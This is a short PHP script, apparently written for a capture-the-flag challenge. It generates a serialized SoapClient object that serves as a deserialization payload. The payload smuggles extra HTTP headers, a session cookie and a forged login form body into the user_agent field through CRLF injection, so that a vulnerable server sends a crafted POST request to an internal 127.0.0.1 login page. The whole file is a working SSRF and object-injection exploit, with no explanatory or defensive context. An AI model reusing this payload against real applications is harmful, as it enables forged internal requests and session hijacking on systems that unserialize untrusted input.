<?php
class get_simple_soap{
	
	static public $url = 'http://127.0.0.1/page/login/qhq-run';
	static public $ua = 'DQ';
	static public $params = array();
	static public $data = array('username' => 'DQ','password'=>'baEN2y8sqr9Ma7HrY2FV3HYXq2ZATdkt8WVN7DtjpRPaTz2Egx');
	static public $cookie = array('PHPSESSID' => 'dudtev0j8eplfhn57ai764hdkn');
	static public $headers = array('z'=>'ls');
	
	private function soap_data($config){
	
		$cookie = array();
		$headers = array();
		$tags = array();
		foreach($config['cookies'] as $key => $value){
			array_push($cookie,$key.'='.$value);
		}
		foreach($config['headers'] as $key => $value){
			array_push($headers,$key.':'.$value);
		}
	
		$params = http_build_query($config['params']);
		$data = http_build_query($config['data']);
		
		$content_type = 'Content-Type: application/x-www-form-urlencoded';
		$content_length = 'Content-Length: '.strlen($data);

		if(!empty($cookie)) array_push($tags,"Cookie:".join(';',$cookie));
		if(!empty($headers)) array_push($tags,join("\x0d\x0a",$headers));
		array_push($tags,$content_type,$content_length);
		array_unshift($tags,$config['ua']);
		
		$contents = join("\x0d\x0a",$tags)."\x0d\x0a\x0d\x0a".$data;

		$soap = new SoapClient(null, array(
			'location' => $config['url'].($params?'?'.$params:''),
			'user_agent' => $contents,
			'uri' => '2333'
		));

		return serialize($soap);
	
	}
	
	public function __toString(){
	
		return $this->soap_data(array(
				'url' => self::$url,
				'ua' => self::$ua,
				'params' => self::$params,
				'data' => self::$data,
				'cookies' => self::$cookie,
				'headers' => self::$headers
				));	
	}
	
}

echo (string) new get_simple_soap();

?>
